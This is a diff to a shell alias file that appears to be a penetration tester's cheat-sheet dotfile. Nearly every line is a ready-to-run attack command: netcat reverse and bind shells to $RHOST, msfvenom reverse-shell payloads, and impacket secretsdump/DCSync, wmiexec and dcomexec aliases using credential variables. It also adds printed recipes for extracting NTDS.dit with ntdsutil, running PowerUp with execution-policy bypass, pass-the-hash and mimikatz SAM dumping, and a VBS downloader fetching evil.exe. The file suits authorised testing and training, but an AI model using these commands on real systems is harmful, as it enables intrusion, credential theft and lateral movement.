@@ -180,6 +180,7 @@ alias iptlistout='iptables -L OUTPUT -n -v --line-numbers'
 alias iptlistfw='iptables -L FORWARD -n -v --line-numbers'
 
 ### nc ### 
+alias rev='nc -nvlp '
 alias nc-trad-rev='nc -nv -e /bin/sh $RHOST $RPORT'
 alias nc-trad-bind='nc -nv -e /bin/sh -l $LPORT'
 alias nc-trad-rev='nc -nv -e /bin/bash $RHOST $RPORT'
@@ -363,6 +364,7 @@ alias ssh-remote-portfwd="ssh -N -R $LHOST:$LPORT:$RHOST:$RPORT $SUSER@$LHOST"
 alias ssh-socks4proxy="ssh -N -D $LHOST:$LPORT $SUSER@$SPROXY"
 
 # other tools
+alias evil-rm-connect="evil-winrm -i $RHOST -u $RUSER -p $RPASS"
 alias gcc-winpe='i686-w64-mingw32-gcc '
 alias john-unix="john --format=crypt "
 alias john-winlm="john --format=LM "
@@ -388,19 +390,23 @@ alias venom_war="msfvenom -p java/jsp_shell_reverse_tcp LHOST=$LHOST LPORT=$LPOR
 #todo: smb-map
 
 #todo: impacket
-alias impacket-launchsmbserver='python smbserver.py NOPEROPE /offsec/stage'
-
-#todo: my-ftp/http/staging-area
+alias ip-launchsmbserver='smbserver.py NOPEROPE /offsec/stage'
+alias ip-secretsdump="impacket-secretsdump $RUSER:$RPASS@$RHOSTS -outputfile impacket-secretsdump"
+alias ip-dcomexec="dcomexec.py -object MMC20 $RUSER:$RPASS@$RHOST"
+alias ip-wmiexec="wmiexec.py $RUSER:$RPASS@$RHOST"
+alias ip-ad-dcsync="impacket-secretsdump -just-dc $DOM/$RUSER:$RPASS@$RHOSTS -outputfile impacket-dcsync"
+alias ip-ad-secretsdump="impacket-secretsdump $DOM/$RUSER:$RPASS@$RHOSTS -outputfile impacket-secretsdump"
+alias ip-ad-dcomexec="dcomexec.py -object MMC20 $DOM/$RUSER:$RPASS@$RHOST"
+alias ip-ad-wmiexec="wmiexec.py $DOM/$RUSER:$RPASS@$RHOST"
 
 # attacking resources
-alias serve-smb='impacket-launchsmbserver'
+alias serve-smb='ip-launchsmbserver'
 alias serve-tftp='atftpd --daemon --port 69 /tftp'
 
 # offsec commands
 alias ostage="cp -t $OFFSTAGE -R "
 
 # usage
-
 alias usage-crunch='
 echo crunch <MIN> <MAX> -t <MASK>
 echo , => Upper
@@ -432,21 +438,21 @@ echo token::elevate
 echo lsadump::sam
 echo exit
 '
+alias usage-ntdsutil='
+echo ntdsutil
+echo activate instance ntds
+echo ifm
+echo create full C:\\Windows\\Temp\\ntdsutil
+echo quit
+echo quit
+'
+alias usage-powerup='
+echo powershell.exe -ep bypass -f Powerup.ps1
+echo Invoke-AllChecks
+'
 alias usage-pth-winexe='
 echo pth-winexe -U DOM/USER%aad3b435b51404eeaad3b435b51404ee:NTLM_HASH //TARGET cmd
 echo pth-winexe -U DOM/USER%LM_HASH:NTLM_HASH //TARGET cmd
-'
-alias usage-ssh-local-portfwde='
-echo "ssh -N -L <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com"
-echo "ssh -N -L kali:445:dc1:445 kali@bounce"
-echo "-- kali:445 ---> 22:bounce:Ephermal --> 445:dc1"
-'
-alias usage-ssh-remote-portfwd='
-echo "ssh -N -R <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com"
-echo "ssh -N -R kali:4444:127.0.0.1:3306 kali@kali"
-echo "-- localhost:3306 <-- 4444:kali"
-echo "ssh -N -R kali:4444:sql:3306 kali@kali"
-echo "-- sql:3306 <-- Ephemeral:localhost:22 <-- 4444:kali"
 '
 alias usage-plink-remote-portfwd='
 echo "cmd.exe /c echo y | plink.exe -ssh -l <user> -pw <pass> -R <bind_addr>:<bind_port>:<target_addr>:<target_port> <proxy>"
@@ -469,6 +475,18 @@ echo "netsh advfirewall firewall add rule name=\"<name>\" protocol=<proto> dir=<
 echo "netsh advfirewall firewall add rule name=\"forward_port_rule\" protocol=TCP dir=in localip=10.11.0.22 localport=4455 action=allow"
 echo 
 echo "-- kali:445 --> 4455:10.11.0.22:: --> 445:192.168.1.110"
+'
+alias usage-ssh-local-portfwde='
+echo "ssh -N -L <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com"
+echo "ssh -N -L kali:445:dc1:445 kali@bounce"
+echo "-- kali:445 ---> 22:bounce:Ephermal --> 445:dc1"
+'
+alias usage-ssh-remote-portfwd='
+echo "ssh -N -R <bind_addr>:<bind_port>:<target_addr>:<target_port> username@sshproxy.com"
+echo "ssh -N -R kali:4444:127.0.0.1:3306 kali@kali"
+echo "-- localhost:3306 <-- 4444:kali"
+echo "ssh -N -R kali:4444:sql:3306 kali@kali"
+echo "-- sql:3306 <-- Ephemeral:localhost:22 <-- 4444:kali"
 '
 alias usage-wintftp-get='
 echo tftp -i 10.11.0.4 get source.file destination.file
@@ -511,6 +529,9 @@ echo "echo For lngCounter = 0 to UBound(varByteArray) >> wget.vbs"
 echo "echo ts.Write Chr(255 And Ascb(Midb(varByteArray,lngCounter + 1, 1))) >> wget.vbs"
 echo "echo Next >> wget.vbs"
 echo "echo ts.Close >> wget.vbs"
+'
+alias usage-whereis-ntds='
+echo reg.exe query hklm\system\currentcontrolset\services\ntds\parameters
 '
 alias usage-win-vbs='
 echo cscript wget.vbs http://10.11.0.4/evil.exe evil.exe
